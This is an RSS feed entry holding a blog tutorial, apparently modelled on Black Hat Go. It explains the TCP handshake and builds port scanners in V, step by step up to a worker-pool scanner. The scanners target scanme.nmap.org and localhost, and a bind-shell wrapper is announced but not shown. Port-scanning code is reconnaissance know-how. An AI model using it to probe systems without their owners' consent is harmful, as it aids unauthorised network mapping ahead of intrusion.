<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>Posts on ashtrace | blog</title>
    <link>https://ashtrace.github.io/posts/</link>
    <description>Recent content in Posts on ashtrace | blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Just adhere to [CC BY-NC 4.0](https://creativecommons.org/licenses/by-nc/4.0/)</copyright>
    <lastBuildDate>Thu, 04 Dec 2025 22:28:48 +0530</lastBuildDate><atom:link href="https://ashtrace.github.io/posts/index.xml" rel="self" type="application/rss+xml" /><icon>https://ashtrace.github.io/logo.svg</icon>
    
    
    <item>
      <title>Black Hat V: TCP Shenanigans</title>
      <link>https://ashtrace.github.io/posts/black_hat_v_tcp/</link>
      <pubDate>Thu, 04 Dec 2025 22:28:48 +0530</pubDate>
      
      <guid>https://ashtrace.github.io/posts/black_hat_v_tcp/</guid>
      <description><![CDATA[<p>The following is the culmination of my first deep dive into V’s vastly undocumented stdlib—pieced together from scattered docs and actual module implementations on GitHub. Bear with me through the re-re-re-I-lost-count-re-invention of <em>the wheel of basic TCP tooling</em> as I learn V’s standard library by building a TCP port scanner, a buffered echo server, a port-forwarder, and a bind-shell wrapper.</p>
<h2 id="understanding-tcp-handshake">Understanding TCP Handshake</h2>
<p>While I sincerely hope that you&rsquo;d be already familiar with the nuances of the TCP handshake, I&rsquo;ll still touch the topic for the sake of it.</p>
<h3 id="successful-handshake">Successful Handshake</h3>
<p>Let&rsquo;s assume the existence of:</p>
<ul>
<li>the earth with its IT Infrastructure</li>
<li>two entities (client and server) ready to talk on TCP</li>
<li>the server has a port open to which the client wants to communicate</li>
</ul>
<p>The handshake:</p>
<ul>
<li>Client says hello marked as &lsquo;SYN&rsquo; packet</li>
<li>Server (port) says thanks for hello + hello, &lsquo;SYN/ACK&rsquo;</li>
<li>Client says thanks for hello &lsquo;ACK&rsquo;.</li>
</ul>
<p>The following image depicts the packets in a successful handshake.</p>
<p><img src="./wireshark-tcp-handshake.png" alt="wireshark-tcp-handshake"></p>
<h3 id="failed-handshake-closed-port">Failed Handshake: Closed port</h3>
<p>Changing assumption</p>
<ul>
<li>the port is closed, server doesn&rsquo;t wanna talk</li>
</ul>
<p>The failed handshake:</p>
<ul>
<li>Client says hello marked as &lsquo;SYN&rsquo; packet</li>
<li>Server (port) says bye, &lsquo;RST&rsquo;</li>
</ul>
<p><img src="./wireshark-closed-port.png" alt="wireshark-closed-port"></p>
<h3 id="failed-handshake-filtered-port">Failed Handshake: Filtered port</h3>
<p>Changing assumption</p>
<ul>
<li>the port is behind a firewall a.k.a <strong>filtered</strong></li>
</ul>
<p>The failed handshake:</p>
<ul>
<li>Client waits (yells in abyss) but no response from the server.</li>
</ul>
<p><img src="./wireshark-filtered-port.png" alt="wireshark-filtered-port"></p>
<h2 id="writing-a-tcp-scanner">Writing a TCP Scanner</h2>
<p>Basis the concepts we discussed above, we can enumerate the state of a port by the kind of the packet returned.</p>
<p>V provides <code>net</code> standard library to work with networks. As per the <a href="https://modules.vlang.io/net.html">documentation</a>:</p>
<blockquote>
<p><em><code>net</code> provides networking functions. It is mostly a wrapper to BSD sockets, so you can listen on a port, connect to remote TCP/UDP services, and communicate with them.</em></p>
</blockquote>
<h3 id="create-a-project">Create a project</h3>
<p>To setup a V project, create a directory with suitable name and run <code>v init</code> from within it.</p>
<p><img src="./new-v-project.png" alt="new-v-project"></p>
<p>After answering the set of questions prompted on terminal, it creates a hello-world project.</p>
<p><img src="new-v-project-2.png" alt="new-v-project-2"></p>
<h3 id="testing-for-port-availablity">Testing for port availablity.</h3>
<p>Following the orginal source of reference (<a href="https://nostarch.com/blackhatgo">Black Hat Go</a>) I utilize the host <strong>scanme.nmap.org</strong> for the following shenanigans.</p>
<p><img src="scanme-nmap-org.png" alt="scanme.nmap.org"></p>
<p>Basis the documentation of <code>net</code> library, there exists <code>dial_tcp</code> function which</p>
<ul>
<li>accepts a single parameter name <code>oaddress</code> of type <code>string</code> that consists of the host and the port separated by a colon <code>:</code>.</li>
<li>returns <code>!&amp;net.TcpConn</code> i.e. either a reference to <strong>TcpConn</strong> structure or error in case of successful or failed connection respectively.</li>
</ul>
<p>In the following code, I use <code>net.dial_tcp</code> to connect to <strong>scanme.nmap.org</strong> at port <strong>80</strong>. The <a href="https://docs.vlang.io/statements-&amp;-expressions.html#if-unwrapping"><code>if</code>-unwrapping</a> verfies for a successfully connection. If an error is returned by <code>net.dial_tcp</code>, the initialization of <code>conn</code> returns <code>false</code> and the condition is validated approriately.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">module</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">net</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">host</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">scanme</span>.<span style="color:#a6e22e">nmap</span>.<span style="color:#a6e22e">org</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">port</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">conn</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">dial_tcp</span>(<span style="color:#960050;background-color:#1e0010">&#39;$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>) {                 <span style="color:#75715e">// use `conn` initializatin to convert the net.dial_tcp function call to boolean condition</span>
</span></span><span style="display:flex;"><span>		println(<span style="color:#e6db74">&#34;Successfully connected to ${host}:${port}&#34;</span>)
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		println(<span style="color:#e6db74">&#34;Failed to connect to ${host}:${port}&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>You can run the code mentioned above as follows (skipping the <code>-w</code> flag allows the v compilter to complain for unused variable <code>conn</code>).</p>
<p><img src="basic-port-connection-successful.png" alt="basic-port-connection-successful"></p>
<h3 id="performing-non-concurrent-scanning">Performing Non-concurrent Scanning</h3>
<p>Utilizing a loop would help to rotate the <code>port</code> value in the connection string parameter to <code>net.dial_tcp</code>. Also, <code>.close()</code> can be used on a mutable instance of <code>net.TcpConn</code> to close the connection.</p>
<p>A sample code to scan the first hundred ports may appear as:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">module</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">net</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">host</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">scanme</span>.<span style="color:#a6e22e">nmap</span>.<span style="color:#a6e22e">org</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">port</span> <span style="color:#a6e22e">in</span> <span style="color:#ae81ff">0..1024</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">dial_tcp</span>(<span style="color:#960050;background-color:#1e0010">&#39;$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>) {
</span></span><span style="display:flex;"><span>			println(<span style="color:#e6db74">&#34;Successfully connected to ${host}:${port}&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">conn</span>.close() <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>				println(<span style="color:#e6db74">&#34;Failed to close connection to ${host}:${port}&#34;</span>)
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>			println(<span style="color:#e6db74">&#34;Failed to connect to ${host}:${port}&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img src="basic-port-scan.png" alt="basic-port-scan"></p>
<h3 id="performing-concurrent-scanning">Performing Concurrent Scanning</h3>
<p>I will use goroutines provided by V runtime to execute concurrent lightweight threads.</p>
<p>Firstly, I create a <a href="https://docs.vlang.io/functions-2.html#closures">closure</a> within <code>main()</code> to use the <code>host</code> variable and pass it a <code>port</code> parameter.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> [<span style="color:#a6e22e">host</span>] (<span style="color:#a6e22e">port</span> <span style="color:#66d9ef">int</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">dial_tcp</span>(<span style="color:#960050;background-color:#1e0010">&#39;$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>) {
</span></span><span style="display:flex;"><span>		println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Successfully</span> <span style="color:#a6e22e">connected</span> <span style="color:#a6e22e">to</span> <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>.close() <span style="color:#a6e22e">or</span> { println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Failed</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">connect</span> <span style="color:#a6e22e">to</span> <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>) }
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Failed</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">connect</span> <span style="color:#a6e22e">to</span> <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Next, I use this function with goroutines to scan first 100 ports</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">module</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">net</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">host</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">scanme</span>.<span style="color:#a6e22e">nmap</span>.<span style="color:#a6e22e">org</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">p</span> <span style="color:#a6e22e">in</span> <span style="color:#ae81ff">0..100</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">fn</span> [<span style="color:#a6e22e">host</span>] (<span style="color:#a6e22e">port</span> <span style="color:#66d9ef">int</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">dial_tcp</span>(<span style="color:#960050;background-color:#1e0010">&#39;$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>) {
</span></span><span style="display:flex;"><span>				println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Successfully</span> <span style="color:#a6e22e">connected</span> <span style="color:#a6e22e">to</span> <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">conn</span>.close() <span style="color:#a6e22e">or</span> { println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Failed</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">connect</span> <span style="color:#a6e22e">to</span> <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>) }
</span></span><span style="display:flex;"><span>			} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>				println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Failed</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">connect</span> <span style="color:#a6e22e">to</span> <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}(<span style="color:#a6e22e">p</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Owing to lack of wait for the goroutines to finish their work, the program exits before connections are established and the program fails to provide results.</p>
<p><img src="./too-fast-scanner.png" alt="too-fast-scanner"></p>
<p>Adding a <code>wait()</code> for the goroutines does allow for the execution of the function to finish but the results may vary owing to limitation of network resources.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">module</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">net</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">host</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">localhost</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">routines</span> <span style="color:#f92672">:=</span> []<span style="color:#a6e22e">thread</span>{}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">p</span> <span style="color:#a6e22e">in</span> <span style="color:#ae81ff">0..65536</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">routines</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#66d9ef">go</span> <span style="color:#a6e22e">fn</span> [<span style="color:#a6e22e">host</span>] (<span style="color:#a6e22e">port</span> <span style="color:#66d9ef">int</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">dial_tcp</span>(<span style="color:#960050;background-color:#1e0010">&#39;$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>) {
</span></span><span style="display:flex;"><span>				println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Successfully</span> <span style="color:#a6e22e">connected</span> <span style="color:#a6e22e">to</span> <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">conn</span>.close() <span style="color:#a6e22e">or</span> { println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Failed</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">connect</span> <span style="color:#a6e22e">to</span> <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>) }
</span></span><span style="display:flex;"><span>			} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>				println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Failed</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">connect</span> <span style="color:#a6e22e">to</span> <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}(<span style="color:#a6e22e">p</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">routines</span>.<span style="color:#a6e22e">wait</span>()
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img src="./inconsistent-scanner.png" alt="inconsistent-scanner"></p>
<h3 id="port-scanning-using-worker-pools">Port Scanning using worker pools</h3>
<p>To avoid inconsistencies, a pool of goroutines can be created to manage the task being performed. A <code>for</code> loop can be used to create a resource pool of worker goroutines. Next, in <code>main()</code> <em>thread</em>, use a <strong>channel</strong> to provide work.</p>
<p>To keep track of a worker, I will use <a href="https://modules.vlang.io/sync.html#readme_sync"><code>sync</code></a> module&rsquo;s <a href="https://modules.vlang.io/sync.html#WaitGroup"><code>WaitGroup</code></a> implementation.</p>
<p>The following code segment creates a resource pool of ten workers and uses them to output numbers within the 0 to 99 (inclusive) range using a buffered channel with a capacity of 100 elements.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">module</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">sync</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">ch</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>) {	<span style="color:#75715e">// worker function</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> {				
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">val</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">ch</span> <span style="color:#a6e22e">or</span> { <span style="color:#66d9ef">continue</span> } 		<span style="color:#75715e">// monitor the channel for input</span>
</span></span><span style="display:flex;"><span>		println(<span style="color:#960050;background-color:#1e0010">&#39;$</span>{<span style="color:#a6e22e">val</span>}<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">n</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ch</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>{<span style="color:#a6e22e">cap</span>: <span style="color:#ae81ff">10</span>}			<span style="color:#75715e">// instantiate a buffered channel to provide port number to the worker function</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">wg</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">sync</span>.<span style="color:#a6e22e">new_waitgroup</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span> <span style="color:#a6e22e">in</span> <span style="color:#ae81ff">0.</span>.<span style="color:#a6e22e">ch</span>.<span style="color:#a6e22e">cap</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">wg</span>.<span style="color:#66d9ef">go</span>(<span style="color:#a6e22e">fn</span> [<span style="color:#a6e22e">ch</span>] () {			<span style="color:#75715e">// WaitGroup.go() function manages the WaitGroup.add() and WaitGroup.done() function calls</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">ch</span>)
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#a6e22e">in</span> <span style="color:#ae81ff">0..100</span> {				<span style="color:#75715e">// Communicate port number through the channel</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ch</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">i</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">wait</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ch</span>.close()
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>When the previously built code for port scan is plugged into the worker function, I do get results but in no particular order. (I separated the WaitGroup call  <code>wg.go</code> into <code>wg.add()</code> and <code>wg.done()</code> for better control).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">module</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">net</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">sync</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">host</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">ports</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">wg</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">sync</span>.<span style="color:#a6e22e">WaitGroup</span>) {		<span style="color:#75715e">// worker function</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> {				
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">port</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">ports</span> <span style="color:#a6e22e">or</span> { <span style="color:#66d9ef">continue</span> } 								<span style="color:#75715e">// monitor the channel for input</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">dial_tcp</span>(<span style="color:#960050;background-color:#1e0010">&#39;$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>) {
</span></span><span style="display:flex;"><span>			println(<span style="color:#e6db74">&#34;Successfully connected to ${host}:${port}&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">conn</span>.close() <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>				println(<span style="color:#e6db74">&#34;Failed to close connection to ${host}:${port}&#34;</span>)
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>			println(<span style="color:#e6db74">&#34;Failed to connect to ${host}:${port}&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">done</span>()														<span style="color:#75715e">// signify work completion</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ports</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>{<span style="color:#a6e22e">cap</span>: <span style="color:#ae81ff">100</span>}			<span style="color:#75715e">// instantiate a buffered channel to provide port number to the worker function</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">wg</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">sync</span>.<span style="color:#a6e22e">new_waitgroup</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span> <span style="color:#a6e22e">in</span> <span style="color:#ae81ff">0.</span>.<span style="color:#a6e22e">ports</span>.<span style="color:#a6e22e">cap</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">worker</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">localhost</span><span style="color:#960050;background-color:#1e0010">&#39;</span>, <span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">wg</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">port</span> <span style="color:#a6e22e">in</span> <span style="color:#ae81ff">0..65536</span> {				
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">add</span>(<span style="color:#ae81ff">1</span>)						<span style="color:#75715e">// add the work</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ports</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">port</span>					<span style="color:#75715e">// Communicate port number through the channel</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">wait</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ports</span>.close()
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img src="no-order-concurrent-scan.png" alt="no-order-concurrent-scan"></p>
